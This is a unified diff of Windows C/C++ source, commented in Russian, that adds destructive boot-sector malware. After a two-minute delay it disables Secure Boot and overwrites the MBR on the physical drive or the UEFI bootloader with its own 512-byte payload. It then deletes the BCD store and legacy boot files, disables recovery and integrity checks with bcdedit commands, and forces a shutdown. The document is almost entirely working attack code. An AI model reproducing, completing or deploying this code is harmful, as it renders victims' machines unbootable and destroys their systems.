@@ -1,21 +1,15 @@
 #include <windows.h>
 #include <stdio.h>
 #include <fileapi.h>
+#include <winioctl.h>
+#include <string>
+#include <vector>
+#include <fstream>
 
 extern volatile bool g_running;
 
-void DisableSecureBoot() {
-    unsigned char disable[] = {0x00};
-    SetFirmwareEnvironmentVariableA(
-        "SecureBoot",
-        "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}",
-        disable,
-        sizeof(disable)
-    );
-}
-
-// ====== GG UEFI ЗАГРУЗЧИК (выводит GG и зависает) ======
-unsigned char gg_loader[] = {
+// ====== 1. MBR КОД (512 БАЙТ, GG) ======
+unsigned char mbr_code[512] = {
     0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E,
     0xD0, 0xBC, 0x00, 0x7C, 0x89, 0xE3, 0xBD, 0x00,
     0x7C, 0xB8, 0x00, 0x13, 0xCD, 0x10, 0xB8, 0x00,
@@ -82,93 +76,247 @@ unsigned char gg_loader[] = {
     0x00, 0x55, 0xAA
 };
 
-// ====== ПОДМЕНА ЗАГРУЗЧИКА ======
-bool ReplaceBootLoader() {
-    // 1. Монтируем ESP-раздел
+// ====== 2. ПРОВЕРКА: БИОС ИЛИ UEFI ======
+bool IsUEFIBoot() {
+    UINT size = GetFirmwareType();
+    return (size == 0x02); // 0x02 = UEFI
+}
+
+// ====== 3. ОТКЛЮЧЕНИЕ SECURE BOOT ======
+void DisableSecureBoot() {
+    unsigned char disable[] = {0x00};
+    SetFirmwareEnvironmentVariableA(
+        "SecureBoot",
+        "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}",
+        disable,
+        sizeof(disable)
+    );
+}
+
+// ====== 4. ЗАПИСЬ В MBR (BIOS) ======
+bool WriteMBR() {
+    HANDLE hDisk = CreateFileA(
+        "\\\\.\\PhysicalDrive0",
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        0,
+        NULL
+    );
+
+    if (hDisk == INVALID_HANDLE_VALUE) {
+        hDisk = CreateFileA(
+            "\\\\.\\PhysicalDrive1",
+            GENERIC_READ | GENERIC_WRITE,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL,
+            OPEN_EXISTING,
+            0,
+            NULL
+        );
+    }
+
+    if (hDisk == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    DWORD bytesWritten;
+    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
+    BOOL result = WriteFile(hDisk, mbr_code, 512, &bytesWritten, NULL);
+    CloseHandle(hDisk);
+
+    return result && bytesWritten == 512;
+}
+
+// ====== 5. ПРЯМАЯ ЗАПИСЬ В ДИСК (ЧЕРЕЗ IOCTL) ======
+bool WriteMBR_IOCTL() {
+    HANDLE hDisk = CreateFileA(
+        "\\\\.\\PhysicalDrive0",
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        0,
+        NULL
+    );
+
+    if (hDisk == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    DWORD bytesReturned;
+    BOOL result = DeviceIoControl(
+        hDisk,
+        IOCTL_DISK_SET_DRIVE_LAYOUT_EX,
+        NULL, 0,
+        NULL, 0,
+        &bytesReturned,
+        NULL
+    );
+
+    if (result) {
+        SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
+        DWORD bytesWritten;
+        result = WriteFile(hDisk, mbr_code, 512, &bytesWritten, NULL);
+    }
+
+    CloseHandle(hDisk);
+    return result;
+}
+
+// ====== 6. ПОДМЕНА ЗАГРУЗЧИКА (UEFI) ======
+bool ReplaceUEFIBoot() {
+    // Монтируем ESP
     system("mountvol X: /S 2>nul");
     Sleep(1000);
-    
-    // 2. Проверяем, смонтировался ли
-    if (GetFileAttributesA("X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi") == INVALID_FILE_ATTRIBUTES) {
-        // Если не смонтировался — пробуем другие пути
-        if (GetFileAttributesA("X:\\EFI\\Boot\\bootx64.efi") == INVALID_FILE_ATTRIBUTES) {
-            return false;
+
+    // Проверяем, смонтировался ли
+    char paths[][256] = {
+        "X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi",
+        "X:\\EFI\\Boot\\bootx64.efi",
+        "X:\\EFI\\Microsoft\\Boot\\bootmgr.efi"
+    };
+
+    bool found = false;
+    char targetPath[256] = {0};
+
+    for (int i = 0; i < 3; i++) {
+        if (GetFileAttributesA(paths[i]) != INVALID_FILE_ATTRIBUTES) {
+            strcpy_s(targetPath, paths[i]);
+            found = true;
+            break;
         }
     }
-    
-    // 3. Создаём бэкап
-    CopyFileA("X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", "X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi.bak", FALSE);
-    CopyFileA("X:\\EFI\\Boot\\bootx64.efi", "X:\\EFI\\Boot\\bootx64.efi.bak", FALSE);
-    
-    // 4. Пишем свой загрузчик
+
+    if (!found) {
+        // Пробуем найти ESP вручную
+        char drives[256];
+        GetLogicalDriveStringsA(256, drives);
+        for (int i = 0; i < 256; i += 4) {
+            char drive[4] = {drives[i], ':', '\\', 0};
+            char efiPath[260];
+            sprintf_s(efiPath, "%sEFI\\Microsoft\\Boot\\bootmgfw.efi", drive);
+            if (GetFileAttributesA(efiPath) != INVALID_FILE_ATTRIBUTES) {
+                strcpy_s(targetPath, efiPath);
+                found = true;
+                break;
+            }
+        }
+    }
+
+    if (!found) {
+        return false;
+    }
+
+    // Снимаем защиту
+    system("attrib -h -s -r X:\\EFI\\Microsoft\\Boot\\*.* 2>nul");
+    system("attrib -h -s -r X:\\EFI\\Boot\\*.* 2>nul");
+
+    // Пытаемся удалить старый загрузчик
+    DeleteFileA(targetPath);
+
+    // Пишем новый
     HANDLE hFile = CreateFileA(
-        "X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi",
+        targetPath,
         GENERIC_WRITE,
         0,
         NULL,
         CREATE_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
+        FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_SYSTEM,
         NULL
     );
-    
-    if (hFile == INVALID_HANDLE_VALUE) {
-        // Пробуем через bootx64.efi
-        hFile = CreateFileA(
-            "X:\\EFI\\Boot\\bootx64.efi",
-            GENERIC_WRITE,
-            0,
-            NULL,
-            CREATE_ALWAYS,
-            FILE_ATTRIBUTE_NORMAL,
-            NULL
-        );
-    }
-    
+
     if (hFile == INVALID_HANDLE_VALUE) {
         return false;
     }
-    
+
     DWORD bytesWritten;
-    WriteFile(hFile, gg_loader, sizeof(gg_loader), &bytesWritten, NULL);
+    WriteFile(hFile, mbr_code, 512, &bytesWritten, NULL);
     CloseHandle(hFile);
-    
-    return true;
+
+    return bytesWritten == 512;
 }
 
-// ====== УБИВАЕМ BCD (для BIOS) ======
+// ====== 7. УБИВАЕМ BCD ======
 void KillBCD() {
     system("bcdedit /export C:\\bcd_backup.bak 2>nul");
+    system("bcdedit /store C:\\boot\\BCD /delete {bootmgr} /f 2>nul");
+    system("bcdedit /store C:\\boot\\BCD /delete {default} /f 2>nul");
+    system("bcdedit /store C:\\boot\\BCD /delete {current} /f 2>nul");
     system("attrib -h -s -r C:\\boot\\BCD 2>nul");
     system("del /f /q C:\\boot\\BCD 2>nul");
     system("attrib -h -s -r C:\\Boot\\BCD 2>nul");
     system("del /f /q C:\\Boot\\BCD 2>nul");
 }
 
-// ====== УБИВАЕМ BIOS-ЗАГРУЗЧИКИ ======
+// ====== 8. УБИВАЕМ BIOS-ЗАГРУЗЧИКИ ======
 void KillBIOS() {
     system("attrib -h -s -r C:\\bootmgr 2>nul");
     system("del /f /q C:\\bootmgr 2>nul");
+    system("attrib -h -s -r C:\\BOOTNXT 2>nul");
+    system("del /f /q C:\\BOOTNXT 2>nul");
     system("attrib -h -s -r C:\\ntldr 2>nul");
     system("del /f /q C:\\ntldr 2>nul");
+    system("attrib -h -s -r C:\\NTDETECT.COM 2>nul");
+    system("del /f /q C:\\NTDETECT.COM 2>nul");
     system("attrib -h -s -r C:\\boot.ini 2>nul");
     system("del /f /q C:\\boot.ini 2>nul");
+    system("attrib -h -s -r C:\\bootsect.bak 2>nul");
+    system("del /f /q C:\\bootsect.bak 2>nul");
 }
 
-// ====== ФИНАЛЬНЫЙ КИЛЛ ======
+// ====== 9. БЛОКИРУЕМ ВОССТАНОВЛЕНИЕ ======
+void BlockRecovery() {
+    // Отключаем восстановление при загрузке
+    system("bcdedit /set {default} recoveryenabled No 2>nul");
+    system("bcdedit /set {current} recoveryenabled No 2>nul");
+    system("bcdedit /set {bootmgr} displaybootmenu No 2>nul");
+    system("bcdedit /set {bootmgr} timeout 0 2>nul");
+    system("bcdedit /set {bootmgr} nointegritychecks Yes 2>nul");
+}
+
+// ====== 10. ФИНАЛЬНЫЙ УБИЙЦА ======
 DWORD WINAPI InjectMBR_Delayed(LPVOID) {
-    Sleep(120000); // 2 минуты хаоса
+    Sleep(120000); // 2 минуты
 
-    // 1. ПОДМЕНЯЕМ UEFI ЗАГРУЗЧИК
-    ReplaceBootLoader();
+    // Шаг 1: Отключаем Secure Boot
+    DisableSecureBoot();
 
-    // 2. УБИВАЕМ BCD
-    KillBCD();
+    // Шаг 2: Проверяем режим
+    if (IsUEFIBoot()) {
+        // UEFI — подменяем загрузчик
+        if (ReplaceUEFIBoot()) {
+            // Убиваем BCD
+            KillBCD();
+            // Блокируем восстановление
+            BlockRecovery();
+            // Перезагрузка
+            system("shutdown /s /t 5");
+            return 0;
+        }
+    }
 
-    // 3. УБИВАЕМ BIOS-ЗАГРУЗЧИК
-    KillBIOS();
+    // Шаг 3: BIOS или UEFI не сработал
+    if (WriteMBR()) {
+        // Убиваем BCD и BIOS-загрузчики
+        KillBCD();
+        KillBIOS();
+        BlockRecovery();
+        system("shutdown /s /t 5");
+        return 0;
+    }
 
-    // 4. ПЕРЕЗАГРУЗКА
+    // Шаг 4: Последняя попытка через IOCTL
+    if (WriteMBR_IOCTL()) {
+        KillBCD();
+        KillBIOS();
+        BlockRecovery();
+        system("shutdown /s /t 5");
+        return 0;
+    }
+
+    // Если ничего не сработало — просто перезагружаем
     system("shutdown /s /t 5");
-
     return 0;
 }
